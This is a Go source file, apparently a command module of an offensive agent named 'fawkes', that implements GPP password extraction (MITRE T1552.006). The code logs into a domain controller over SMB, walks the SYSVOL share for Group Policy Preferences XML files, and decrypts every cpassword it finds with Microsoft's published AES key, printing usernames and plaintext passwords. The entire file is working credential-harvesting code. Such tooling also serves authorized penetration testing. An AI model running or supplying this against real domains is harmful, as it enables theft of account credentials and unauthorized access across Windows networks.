package commands

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"encoding/xml"
	"fmt"
	"io"
	"net"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"github.com/hirochachacha/go-smb2"
)

type GppPasswordCommand struct{}

func (c *GppPasswordCommand) Name() string { return "gpp-password" }
func (c *GppPasswordCommand) Description() string {
	return "Extract Group Policy Preferences passwords from SYSVOL (T1552.006)"
}

type gppArgs struct {
	Server   string `json:"server"`
	Username string `json:"username"`
	Password string `json:"password"`
	Domain   string `json:"domain"`
	Port     int    `json:"port"`
}

// gppResult holds a single discovered GPP credential
type gppResult struct {
	File     string
	Username string
	Password string
	Changed  string
	NewName  string
	Action   string
}

// Microsoft published this AES-256 key in MSDN documentation (MS14-025)
// https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be
var gppAESKey = []byte{
	0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9,
	0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8,
	0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90,
	0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b,
}

func (c *GppPasswordCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required. Use -server <DC> -username <user@domain> -password <pass>",
			Status:    "error",
			Completed: true,
		}
	}

	var args gppArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if args.Server == "" {
		return structs.CommandResult{
			Output:    "Error: server (domain controller) is required",
			Status:    "error",
			Completed: true,
		}
	}
	if args.Username == "" || args.Password == "" {
		return structs.CommandResult{
			Output:    "Error: username and password are required",
			Status:    "error",
			Completed: true,
		}
	}

	if args.Port <= 0 {
		args.Port = 445
	}

	// Parse domain from username
	if args.Domain == "" {
		if parts := strings.SplitN(args.Username, "@", 2); len(parts) == 2 {
			args.Domain = parts[1]
			args.Username = parts[0]
		} else if parts := strings.SplitN(args.Username, `\`, 2); len(parts) == 2 {
			args.Domain = parts[0]
			args.Username = parts[1]
		}
	}

	output, err := searchGPPPasswords(args)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "success",
		Completed: true,
	}
}

// GPP XML structures for parsing cpassword attributes
type gppProperties struct {
	CPassword string `xml:"cpassword,attr"`
	UserName  string `xml:"userName,attr"`
	NewName   string `xml:"newName,attr"`
	Action    string `xml:"action,attr"`
}

type gppItem struct {
	Properties gppProperties `xml:"Properties"`
	Changed    string        `xml:"changed,attr"`
}

type gppGroups struct {
	XMLName xml.Name  `xml:"Groups"`
	Users   []gppItem `xml:"User"`
}

type gppScheduledTasks struct {
	XMLName xml.Name  `xml:"ScheduledTasks"`
	Tasks   []gppItem `xml:"Task"`
}

type gppServices struct {
	XMLName  xml.Name  `xml:"NTServices"`
	Services []gppItem `xml:"NTService"`
}

type gppDataSources struct {
	XMLName     xml.Name  `xml:"DataSources"`
	DataSources []gppItem `xml:"DataSource"`
}

type gppDrives struct {
	XMLName xml.Name  `xml:"Drives"`
	Drives  []gppItem `xml:"Drive"`
}

func searchGPPPasswords(args gppArgs) (string, error) {
	// Connect to DC via SMB
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", args.Server, args.Port), 10*time.Second)
	if err != nil {
		return "", fmt.Errorf("TCP connect to %s:%d: %v", args.Server, args.Port, err)
	}

	initiator := &smb2.NTLMInitiator{
		User:     args.Username,
		Password: args.Password,
		Domain:   args.Domain,
	}

	d := &smb2.Dialer{Initiator: initiator}
	session, err := d.Dial(conn)
	if err != nil {
		conn.Close()
		return "", fmt.Errorf("SMB auth failed: %v", err)
	}
	defer session.Logoff()

	// Mount SYSVOL share
	share, err := session.Mount(fmt.Sprintf(`\\%s\SYSVOL`, args.Server))
	if err != nil {
		return "", fmt.Errorf("mount SYSVOL: %v", err)
	}
	defer share.Umount()

	// Search for XML files containing GPP passwords
	var results []gppResult
	var filesSearched int

	// GPP XML files are in Policies/{GUID}/Machine/Preferences/ and User/Preferences/
	// Walk the entire SYSVOL looking for XML files
	err = gppWalkDir(share, ".", &results, &filesSearched)
	if err != nil {
		return "", fmt.Errorf("walking SYSVOL: %v", err)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("GPP Password Search on %s\n", args.Server))
	sb.WriteString(fmt.Sprintf("Files searched: %d\n", filesSearched))
	sb.WriteString(strings.Repeat("=", 70) + "\n")

	if len(results) == 0 {
		sb.WriteString("\nNo GPP passwords found.\n")
		sb.WriteString("\nNote: MS14-025 patched this issue in 2014. Modern environments\n")
		sb.WriteString("should not have cpassword attributes in GPP XML files.\n")
		return sb.String(), nil
	}

	sb.WriteString(fmt.Sprintf("\nFound %d GPP credential(s):\n\n", len(results)))

	for i, r := range results {
		sb.WriteString(fmt.Sprintf("--- Credential %d ---\n", i+1))
		sb.WriteString(fmt.Sprintf("  File:     %s\n", r.File))
		sb.WriteString(fmt.Sprintf("  Username: %s\n", r.Username))
		sb.WriteString(fmt.Sprintf("  Password: %s\n", r.Password))
		if r.NewName != "" {
			sb.WriteString(fmt.Sprintf("  NewName:  %s\n", r.NewName))
		}
		if r.Changed != "" {
			sb.WriteString(fmt.Sprintf("  Changed:  %s\n", r.Changed))
		}
		if r.Action != "" {
			sb.WriteString(fmt.Sprintf("  Action:   %s\n", r.Action))
		}
		sb.WriteString("\n")
	}

	return sb.String(), nil
}

func gppWalkDir(share *smb2.Share, path string, results *[]gppResult, filesSearched *int) error {
	entries, err := share.ReadDir(path)
	if err != nil {
		return nil // skip unreadable directories
	}

	for _, entry := range entries {
		fullPath := path + "/" + entry.Name()
		if path == "." {
			fullPath = entry.Name()
		}

		if entry.IsDir() {
			_ = gppWalkDir(share, fullPath, results, filesSearched)
			continue
		}

		// Only process XML files in Preferences directories
		name := strings.ToLower(entry.Name())
		if !strings.HasSuffix(name, ".xml") {
			continue
		}

		// Common GPP XML filenames
		if name != "groups.xml" && name != "scheduledtasks.xml" &&
			name != "services.xml" && name != "datasources.xml" &&
			name != "drives.xml" && name != "printers.xml" {
			continue
		}

		*filesSearched++

		// Read and parse the XML file
		f, err := share.Open(fullPath)
		if err != nil {
			continue
		}

		data, err := io.ReadAll(io.LimitReader(f, 1024*1024)) // 1MB limit
		_ = f.Close()
		if err != nil {
			continue
		}

		content := string(data)
		if !strings.Contains(content, "cpassword") {
			continue
		}

		// Parse based on file type
		gppParseXML(data, fullPath, results)
	}

	return nil
}

func gppParseXML(data []byte, filePath string, results *[]gppResult) {
	// Try each GPP XML type
	var groups gppGroups
	if xml.Unmarshal(data, &groups) == nil {
		for _, item := range groups.Users {
			if item.Properties.CPassword != "" {
				decrypted := gppDecrypt(item.Properties.CPassword)
				*results = append(*results, gppResult{
					File:     filePath,
					Username: item.Properties.UserName,
					Password: decrypted,
					Changed:  item.Changed,
					NewName:  item.Properties.NewName,
					Action:   item.Properties.Action,
				})
			}
		}
	}

	var tasks gppScheduledTasks
	if xml.Unmarshal(data, &tasks) == nil {
		for _, item := range tasks.Tasks {
			if item.Properties.CPassword != "" {
				*results = append(*results, gppResult{
					File:     filePath,
					Username: item.Properties.UserName,
					Password: gppDecrypt(item.Properties.CPassword),
					Changed:  item.Changed,
					Action:   item.Properties.Action,
				})
			}
		}
	}

	var services gppServices
	if xml.Unmarshal(data, &services) == nil {
		for _, item := range services.Services {
			if item.Properties.CPassword != "" {
				*results = append(*results, gppResult{
					File:     filePath,
					Username: item.Properties.UserName,
					Password: gppDecrypt(item.Properties.CPassword),
					Changed:  item.Changed,
					Action:   item.Properties.Action,
				})
			}
		}
	}

	var dataSources gppDataSources
	if xml.Unmarshal(data, &dataSources) == nil {
		for _, item := range dataSources.DataSources {
			if item.Properties.CPassword != "" {
				*results = append(*results, gppResult{
					File:     filePath,
					Username: item.Properties.UserName,
					Password: gppDecrypt(item.Properties.CPassword),
					Changed:  item.Changed,
					Action:   item.Properties.Action,
				})
			}
		}
	}

	var drives gppDrives
	if xml.Unmarshal(data, &drives) == nil {
		for _, item := range drives.Drives {
			if item.Properties.CPassword != "" {
				*results = append(*results, gppResult{
					File:     filePath,
					Username: item.Properties.UserName,
					Password: gppDecrypt(item.Properties.CPassword),
					Changed:  item.Changed,
					Action:   item.Properties.Action,
				})
			}
		}
	}
}

// gppDecrypt decrypts a GPP cpassword using the well-known AES-256-CBC key
// from MS14-025 / MSDN documentation
func gppDecrypt(cpassword string) string {
	if cpassword == "" {
		return ""
	}

	// GPP uses a modified Base64 encoding (replacing special chars)
	// Standard base64 but may have trailing padding issues
	// Pad to multiple of 4
	padded := cpassword
	for len(padded)%4 != 0 {
		padded += "="
	}

	decoded, err := base64.StdEncoding.DecodeString(padded)
	if err != nil {
		return fmt.Sprintf("(decode error: %v)", err)
	}

	// AES-256-CBC with zero IV
	block, err := aes.NewCipher(gppAESKey)
	if err != nil {
		return fmt.Sprintf("(cipher error: %v)", err)
	}

	iv := make([]byte, aes.BlockSize) // zero IV
	mode := cipher.NewCBCDecrypter(block, iv)

	// Ensure data is block-aligned
	if len(decoded)%aes.BlockSize != 0 {
		return fmt.Sprintf("(invalid ciphertext length: %d)", len(decoded))
	}

	plaintext := make([]byte, len(decoded))
	mode.CryptBlocks(plaintext, decoded)

	// Remove PKCS7 padding
	if len(plaintext) > 0 {
		padLen := int(plaintext[len(plaintext)-1])
		if padLen > 0 && padLen <= aes.BlockSize && padLen <= len(plaintext) {
			plaintext = plaintext[:len(plaintext)-padLen]
		}
	}

	// GPP stores passwords as UTF-16LE
	return gppUTF16LEToString(plaintext)
}

// gppUTF16LEToString converts UTF-16LE bytes to a Go string
func gppUTF16LEToString(data []byte) string {
	if len(data) < 2 {
		return string(data)
	}
	var runes []rune
	for i := 0; i+1 < len(data); i += 2 {
		r := rune(data[i]) | rune(data[i+1])<<8
		if r == 0 {
			break
		}
		runes = append(runes, r)
	}
	return string(runes)
}
